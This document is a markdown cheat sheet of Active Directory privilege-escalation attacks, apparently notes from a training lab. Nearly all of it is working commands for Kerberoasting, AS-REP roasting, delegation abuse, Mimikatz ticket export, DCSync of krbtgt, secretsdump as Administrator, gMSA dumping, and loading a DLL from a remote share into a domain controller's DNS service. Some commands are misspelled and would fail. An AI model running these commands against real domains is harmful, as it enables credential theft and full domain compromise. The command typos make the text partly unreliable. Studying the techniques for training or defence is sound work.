# Domain Privesc
---
# Navigation
- **[Kerberoast](#Kerberoast)**
	- [Users With SPN](#Users%20With%20SPN)
	- [AS-REPs](#AS-REPs)
	- [Set SPN](#Set%20SPN)
- **[Unconstrained delegation](#Unconstrained%20delegation)**
	- [Definition](#Definition)
	- [Attack](#Attack)
- **[Constrained delegation](#Constrained%20delegation)**
	- [Definition con](#Definition%20con)
	- [Attack](#Attack)
- **[Further reading](#Further%20reading)**
>**Important:**
>[Synchronizing time is important](Kerberoas#Synchronizing%20time%20is%20important)
---
# Kerberoast
## Users With SPN
1. Find user accounts used as service accounts.
```powershell
#Powerview module
Get-NetUser -SPN
#ActiveDirectory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
2. Request a `TGS`.
```powershell
#ActiveDriectory module
Add-Type -AssemblyName system.IdentityModel
New-Object system.IdentityModel.Tokens.kerberosRequestorsecurityToken -ArgumentList "<ServicePrincipleName>"
```
3. Confirm that we have the `TGS` in memory.
```powershell
klist
```
4. Save the `TGS` to disk.
```powershell
Invoke-Mimikatz -command '"kerberoas::list /export"'
```
5. Get the hash.
```powershell
#Powerview
Request-SPNTicket
```
> **NOTE:**
> Service tickets can be used for Silver ticket attacks
> [[4-Domain persistence#Silver Ticket]]

## AS-REPs
- If a user's `UserAccountControl` settings have "Do not require kerberoas preauthentication" enabled,it's possible to grab user's crackable AS-REP and brute-force it online.
- With sufficient rights `GenericWrite` or `GenericAll`,Preauth can be forced disabled as well.

**Enumerating accounts with preauth disabled.**
```powershell
#Powerview module
Get-DomainUser -PreauthNotRequired -Verbose
#ActiveDirectory module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
**Force disable kerberoas Preauth.**
```powershell
#Powerview module
Set-DomainObject -Identity <USER> -XOR @{useraccountcontrol=41914304} -verbose
```
**Request encrypted AS-REP for offline brute-force**
```powershell
#ASREPRoast module
Get-ASREPHash -UserName <USER> -verbose
```
**To enumerate all users with preauth and request a hash**
```powershell
#ASREPRoast module
Invoke-ASREPRoast -verbose
```
## Set SPN
- With sufficient rights `GenericWrite` or `GenericAll`,a target user's **SPN** can be set to anything (unique in the domain).
- We can then request a `TGS` without special privileges.

**Set a SPN for the user (Must be unique for the domain)**
1. Set the SPN.
```powershell
#Powerview module
Set-DomainObject -Identity <User> -Set @{serviceprincipalname='ops/whatever1'}
#ActiveDirectory module
Set-ADUser -Identity <User> -ServicePrincipalNames @{Add='ops/whatever1'}
```
2. Request a `TGS`.
```powershell
#ActiveDriectory module
Add-Type -AssemblyName system.IdentityModel
New-Object system.IdentityModel.Tokens.kerberosRequestorsecurityToken -ArgumentList "<ServicePrincipleName>"
```
3. Confirm that we have the `TGS` in memory.
```powershell
klist
```
4. Save the `TGS` to disk.
```powershell
Invoke-Mimikatz -command '"kerberoas::list /export"'
```
5. Get the hash.
```powershell
#Powerview
Request-SPNTicket
```
---
# Unconstrained delegation
## Definition
Kerberoas delegation allows to **reuse** the end-user credentials to access resources hosted on a different server.This is typically useful in multi-tier service or applications where kerberoas double hop is required.
- For example, users authetnicates to a web server and the web server makes requests to a DB server.The web server can request access to resources **all of the resources** on the DB server as the user and not as the web server's service account.
> **NOTE:**
> For the above example,the service account for the web service must be trusted for delegation to be able to make request as a user.

**Requirements**:
1. Object with Property **Trust this computer for delegation to any service (Kerberos only)**
2. Must have **ADS_UF_TRUSTED_FOR_DELEGATION**
3. Must not have **ADS_UF_NOT_DELEGATED** flag
4. User must not be in the **Protected Users** group
5. User must not have the flag **Account is sensitive and cannot be delegated**
## Attack
1. **Identify a target**
```powershell
#Powerview module
Get-NetComputer -Unconstrained
#ActiveDirectory module
Get-ADcomputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
#Using impacket (Linux)
impacket-findDelegation <Domain>/<USER>:<PASS>
#Using ldap (Linux)
ldapdomaindump -u "DOMAIN\\Account" -p <PASS> <IP> && grep TRUSTED_FOR_DELEGATION domain_computers.grep
#Crakmapexec (Linux/Windows)
crakmapexec ldap <IP> -u <Username> -p <PASS> --trusted-for-delegation
```
> **NOTE:**
> Domain controllers will always show that they have unconstrained delegation (ignore that).


2. **Get the `TGT`**
```powershell
#Powerview module
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
3. **Now use the hash to attack.**
DCsync attack
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp/krbtgt"'
```
- [[4-Domain persistence#Golden Ticket]]
- [[4-Domain persistence#Silver Ticket]]
- [PrintSpooler bug](https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse#finding-spooler-services-listening)

---
# Constrained delegation
## Definition con.
Microsoft’s next iteration of delegation included the ability to limit where objects had delegation (impersonation) rights to.  Now a front-end web server that needed to impersonate users to access their data on a database could be restricted;** allowing it to only impersonate users on a specific service & system**.  However, as we will find out, the portion of the ticket that limits access to a certain service is not encrypted.  This gives us some room to gain additional access to systems if we gain access to an object configured with these rights. 
If you can gain access to an account (user or computer) that is configured with constrained delegation.  You can find this by searching for the `TRUSTED_TO_AUTH_FOR_DELEGATION` value in the **UserAccountControl** attribute of AD objects.
## Attack
1. **Identify a target **
```bash
#Using impacket (Linux)
impacket-findDelegation <Domain>/<USER>:<PASS>
#Using ldap (Linux)
ldapdomaindump -u "DOMAIN\\Account" -p <PASS> <IP> && grep TRUSTED_FOR_DELEGATION domain_computers.grep
#Crakmapexec (Linux)
crackmapexec ldap <IP> -u <Username> -p <PASS> --trusted-for-delegation
#Active Directory module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```
2. **Getting the NTLM hash**
```bash
impacket-GetUserSPNs <DOMAIN>/<ConstrainedUser> -dc-ip <IP> -request
python3 gMSADumper.py -u <USER> -p <Password> -l <LDAPDomain> -d <Domain>
```
> **Tool** -> [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
> More info about GMSA 
> - [https://adsecurity.org/?p=4367](https://adsecurity.org/?p=4367)
> - [https://cube0x0.github.io/Relaying-for-gMSA/](https://cube0x0.github.io/Relaying-for-gMSA/)

3. **Impersonating with the Silver ticket attack**
```bash
impacket-getST <Doamin>/<ConstrainedUser> -hashes :<HASH>  -spn <DelegationRightsTo> -impersonate Administrator
```
4. **Setting up an environment variable for authentication**
```bash
export KRB5CCNAME=CCACHE_FILE.CCACHE
```
5. **Access services you have the right to.**
```bash
impacket-secretsdump -k <Domain>/Administrator@<DelegationRightsToDomain> -dc-ip <IP> -no-pass
impacket-smbclient -k <Domain>/Administrator@<DelegationRightsToDomain> -dc-ip <IP> -no-pass
```
---
# DNSAdmins
- It's Possible for the members of the `DNSAdmins` group to load arbitrary DLL with the privileges of `dns.exe (SYSTEM)`.
- In case the DC also serves as DNS, this will provide us escalation to DA.
- Need privileges to restart the DNS service.

## Attack
1. **Enumerate the members of the DNSAdmins group.**
```powershell
#Powerview module
Get-NetGroupMember -GroupName "DNSAdmin"
#ActiveDirectory module
Get-ADGroupMember -Identity DNSAdmins
```
> Once we know the members of the DNSAdmins group,we need to compromise a member.we already have of hash of srvadmin because of derivative local admin.

2. **From the privileges of DNSAdmins group member**
```powershell
#configure DLL using dnscmd.exe (Needs RSAT DNS).
dnscmd.exe dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll
#Using DNSServer module (needs RSAT DNS)
$dnsettings= Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All
$dnsettings.ServerLevelPluginDll="\\172.16.50.100\dll\mimilib.dll"
Set-DnsServerSettings -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
```
3. Restart the DNS service (assuming that the DNSAdmins group has the permission to do so).
```powershell
sc.exe \\dcorp-dc stop dns
sc.exe \\dcrop-dc start dns
```
> By default, the mimilib.dll logs all DNS queries to C:\\Windows\\System32\\kiwidns.log
---
# Further reading
- Official Docs ->  [Group managed service accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts)
- Attacks explained (linux) -> [blog.redxorblue](http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)
- Attacks explained -> [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- Cheatsheet -> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-unconstrained-delegation)
- gMSA -> [XCT-notes](https://notes.vulndev.io/notes/misc/labs/group-managed-service-accounts-gmsa)